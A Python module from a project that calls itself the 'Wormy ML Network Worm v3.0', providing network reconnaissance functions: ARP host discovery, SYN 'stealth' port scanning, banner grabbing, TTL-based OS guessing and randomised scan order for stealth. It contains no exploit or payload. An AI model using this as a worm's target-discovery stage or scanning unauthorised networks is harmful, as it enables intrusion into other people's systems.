"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Network utility functions for scanning and reconnaissance
"""


import ipaddress
import random
import socket
import struct
from ipaddress import IPv4Address, IPv4Network
from typing import Dict, List, Optional, Tuple

try:
    import netifaces

    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False

try:
    from scapy.all import ARP, ICMP, IP, TCP, Ether, sr1, srp

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def get_local_ip() -> str:
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"


def get_network_interfaces() -> List[Dict[str, str]]:
    """Get all network interfaces"""
    if not NETIFACES_AVAILABLE:
        return []

    interfaces = []
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                interfaces.append(
                    {
                        "interface": iface,
                        "ip": addr.get("addr", ""),
                        "netmask": addr.get("netmask", ""),
                        "broadcast": addr.get("broadcast", ""),
                    }
                )
    return interfaces


def expand_cidr(cidr: str) -> List[str]:
    """Expand CIDR notation to list of IPs"""
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError:
        return []


def is_ip_in_range(ip: str, cidr: str) -> bool:
    """Check if IP is in CIDR range"""
    try:
        return ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False)
    except ValueError:
        return False


def is_private_ip(ip: str) -> bool:
    """Check if IP is private"""
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def ping_host(ip: str, timeout: int = 2) -> bool:
    """Ping a host using ICMP"""
    if not SCAPY_AVAILABLE:
        return False

    try:
        packet = IP(dst=ip) / ICMP()
        response = sr1(packet, timeout=timeout, verbose=0)
        return response is not None
    except Exception:
        return False


def tcp_ping(ip: str, port: int = 80, timeout: int = 2) -> bool:
    """TCP ping (SYN scan) to check if host is alive"""
    if not SCAPY_AVAILABLE:
        # Fallback to socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    try:
        packet = IP(dst=ip) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=timeout, verbose=0)
        if response and response.haslayer(TCP):
            if response[TCP].flags == 0x12:  # SYN-ACK
                # Send RST to close connection
                rst = IP(dst=ip) / TCP(dport=port, flags="R")
                sr1(rst, timeout=1, verbose=0)
                return True
        return False
    except Exception:
        return False


def arp_scan(network: str, timeout: int = 2) -> List[Tuple[str, str]]:
    """ARP scan to discover hosts on local network"""
    if not SCAPY_AVAILABLE:
        return []

    try:
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=timeout, verbose=0)[0]

        hosts = []
        for sent, received in result:
            hosts.append((received.psrc, received.hwsrc))

        return hosts
    except Exception:
        return []


def get_mac_address(ip: str) -> Optional[str]:
    """Get MAC address for an IP"""
    if not SCAPY_AVAILABLE:
        return None

    try:
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=2, verbose=0)[0]

        if result:
            return result[0][1].hwsrc
        return None
    except Exception:
        return None


def port_scan(ip: str, ports: List[int], timeout: int = 1) -> List[int]:
    """Simple TCP port scan"""
    open_ports = []

    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()

            if result == 0:
                open_ports.append(port)
        except Exception:
            pass

    return open_ports


def stealth_port_scan(ip: str, ports: List[int], timeout: int = 1) -> List[int]:
    """SYN stealth scan"""
    if not SCAPY_AVAILABLE:
        return port_scan(ip, ports, timeout)

    open_ports = []

    for port in ports:
        try:
            # Send SYN
            packet = IP(dst=ip) / TCP(dport=port, flags="S")
            response = sr1(packet, timeout=timeout, verbose=0)

            if response and response.haslayer(TCP):
                if response[TCP].flags == 0x12:  # SYN-ACK
                    open_ports.append(port)
                    # Send RST to close
                    rst = IP(dst=ip) / TCP(dport=port, flags="R")
                    sr1(rst, timeout=1, verbose=0)
        except Exception:
            pass

    return open_ports


def grab_banner(ip: str, port: int, timeout: int = 3) -> Optional[str]:
    """Grab service banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # Try to receive banner
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()

        return banner if banner else None
    except Exception:
        return None


def get_hostname(ip: str) -> Optional[str]:
    """Get hostname from IP"""
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return None


def resolve_hostname(hostname: str) -> Optional[str]:
    """Resolve hostname to IP"""
    try:
        return socket.gethostbyname(hostname)
    except Exception:
        return None


def calculate_subnet(ip: str, netmask: str) -> str:
    """Calculate subnet from IP and netmask"""
    try:
        network = ipaddress.ip_network(f"{ip}/{netmask}", strict=False)
        return str(network)
    except Exception:
        return ""


def random_ip_from_range(cidr: str) -> Optional[str]:
    """Get random IP from CIDR range"""
    ips = expand_cidr(cidr)
    return random.choice(ips) if ips else None


def is_port_open(ip: str, port: int, timeout: int = 1) -> bool:
    """Check if a specific port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def get_ttl(ip: str) -> Optional[int]:
    """Get TTL from ICMP response (helps identify OS)"""
    if not SCAPY_AVAILABLE:
        return None

    try:
        packet = IP(dst=ip) / ICMP()
        response = sr1(packet, timeout=2, verbose=0)
        if response:
            return response.ttl
        return None
    except Exception:
        return None


def guess_os_from_ttl(ttl: int) -> str:
    """Guess OS based on TTL value"""
    if ttl <= 64:
        return "Linux/Unix"
    elif ttl <= 128:
        return "Windows"
    elif ttl <= 255:
        return "Cisco/Network Device"
    else:
        return "Unknown"


def create_tcp_packet(dst_ip: str, dst_port: int, src_port: int = None, flags: str = "S"):
    """Create custom TCP packet"""
    if not SCAPY_AVAILABLE:
        return None

    if src_port is None:
        src_port = random.randint(1024, 65535)

    return IP(dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags=flags)


def randomize_scan_order(ips: List[str]) -> List[str]:
    """Randomize IP scan order for stealth"""
    shuffled = ips.copy()
    random.shuffle(shuffled)
    return shuffled


def calculate_network_size(cidr: str) -> int:
    """Calculate number of hosts in CIDR range"""
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return network.num_addresses - 2  # Exclude network and broadcast
    except Exception:
        return 0


if __name__ == "__main__":
    # Test utilities
    print("Local IP:", get_local_ip())
    print("\nExpanding 192.168.1.0/29:")
    ips = expand_cidr("192.168.1.0/29")
    print(f"  {ips}")

    print("\nTesting localhost:")
    print(f"  Port 80 open: {is_port_open('127.0.0.1', 80)}")
